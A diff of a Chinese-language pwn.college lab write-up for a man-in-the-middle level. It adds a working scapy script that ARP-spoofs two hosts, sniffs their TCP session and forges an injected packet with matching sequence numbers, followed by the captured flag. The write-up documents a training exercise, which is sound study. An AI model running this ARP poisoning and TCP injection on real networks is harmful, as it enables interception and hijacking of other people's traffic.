@@ -302,14 +302,76 @@ pwn.college{cNTaa8AjxVE-lSXY9DgEeXxNMHz.dFzNzMDL2QjMyMzW}
 ## level14 Man-in-the-middle traffic between two remote hosts and inject extra traffic
 
 从讲解来看，这个题的核心是需要加入对话，而不仅仅是监听，因为对话中有一次性密钥，仅仅监听并不管用，重点是抓住窗口期发送包含有FLAG的包。
-```
-sendp(Ether(src=get_if_hwaddr("eth0"),dst="1e:ed:0e:df:c6:ef ") / ARP(op="is-at",hwsrc=get_if_hwaddr("eth0"),psrc="10.0.0.3",hwdst="1e:ed:0e:df:c6:ef ",pdst="10.0.0.4"),iface="eth0")
-sendp(Ether(src=get_if_hwaddr("eth0"),dst="1e:ed:0e:df:c6:ef ") / ARP(op="is-at",hwsrc=get_if_hwaddr("eth0"),psrc="10.0.0.4",hwdst="1e:ed:0e:df:c6:ef ",pdst="10.0.0.3"),iface="eth0")
-sendp(Ether(src=get_if_hwaddr("eth0"), dst="ee:82:70:44:1c:ba") / IP(src="10.0.0.2", dst="10.0.0.3") / TCP(sport=52914, dport=31337, flags="P", ack=9, window=502, options=[("NOP", None), ("NOP", None), ("Timestamp", (int(time.time()), int((time.time() - int(time.time())) * (2 ** 32))))],seq=1) / b"idk.", iface="eth0")
 
-sendp(Ether(src=get_if_hwaddr("eth0"),dst="ee:82:70:44:1c:ba") / IP(src="10.0.0.2", dst="10.0.0.3") / TCP(sport=48238, dport=31337, flags="PA", ack=38, seq=5) / b"FLAG"，iface="eth0")
+直接写个脚本
 ```
+from scapy.all import *
+
+sendp(Ether(src=get_if_hwaddr("eth0")) / ARP(op="is-at",hwsrc=get_if_hwaddr("eth0"),
+            psrc="10.0.0.3",pdst="10.0.0.4"),iface="eth0") #tell 10.0.0.4，where 10.0.0.3 it is
+sendp(Ether(src=get_if_hwaddr("eth0")) / ARP(op="is-at",hwsrc=get_if_hwaddr("eth0"),
+            psrc="10.0.0.4",pdst="10.0.0.3"),iface="eth0") #tell 10.0.0.3，where 10.0.0.4 it is
+
+packet_data = {
+    'key': '',
+    'dst': '',
+    'src': '',
+    'ipdst': '',
+    'ipsrc': '',
+    'ipflags': '',
+    'sport': 0,
+    'dport': 31337,
+    'flags': '',
+    'seq': 0,
+    'ack': 0
+}
+
+def CallBack(packet):
+    if packet.haslayer('TCP'):
+        tcp = packet['TCP']
+        ip = packet['IP']
+        ether = packet['Ethernet']
+        load = tcp.load if hasattr(tcp, 'load') else b''
+
+        if ip.src == '10.0.0.4' and load != b'ECHO\n':
+            packet_data['key'] = load
+
+
+        if ip.src == '10.0.0.3' and load == b'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n':
+            print("WARNING!!")
+
+            packet_data.update({
+                'ipdst': ip.src,
+                'ipsrc': ip.dst,
+                'flags': 'PA',
+                'ipflags': ip.flags,
+                'dst': ether.src,
+                'src': ether.dst,
+                'dport': tcp.sport,
+                'sport': tcp.dport,
+                'seq': tcp.ack,
+                'ack': tcp.seq + 29
+            })
+
+            raw_pkt = Raw(load='FLAG\n')
+            (Ether(src=packet_data['src'], dst=packet_data['dst']) /
+             IP(src=packet_data['ipsrc'], dst=packet_data['ipdst'], flags=packet_data['ipflags']) /
+             TCP(dport=packet_data['dport'], sport=packet_data['sport'], seq=packet_data['seq'], ack=packet_data['ack'], flags=packet_data['flags']) /
+             raw_pkt).display()
+
+            sendp(Ether(src=packet_data['src'], dst=packet_data['dst']) /
+                  IP(src=packet_data['ipsrc'], dst=packet_data['ipdst'], flags=packet_data['ipflags']) /
+                  TCP(dport=packet_data['dport'], sport=packet_data['sport'], seq=packet_data['seq'], ack=packet_data['ack'], flags=packet_data['flags']) /
+                  raw_pkt, iface="eth0")
+
+sniff(filter="tcp", prn=CallBack, iface='eth0', count=100)
+
 
 ```
-sendp(Ether(src=get_if_hwaddr("eth0"), dst="ee:82:70:44:1c:ba") / IP(src="10.0.0.2", dst="10.0.0.3") / TCP(sport=52914, dport=31337, flags="PA", ack=9, window=64256, options=[("NOP", None), ("NOP", None), ("Timestamp", (int(time.time()), int((time.time() - int(time.time())) * (2 ** 32))))],seq=1) / b"idk.", iface="eth0")
+然后顺利拿到flag
 ```
+pwn.college{A3pb7kfH8On2sOV2_hSlPGWG_P8.dJzNzMDL2QjMyMzW}
+```
+![level14](image-6.png)
+
+**碎碎念：这个部分其实不太难，重点是学会scapy即可，但是诡异的地方在于必须使用tmux，好像这样才能在一个父线程之下，不然你在另一个shell里面使用python脚本，这个shell里面的tcpdump抓不到东西。这曾经困扰了我很久，别的就没啥了。**
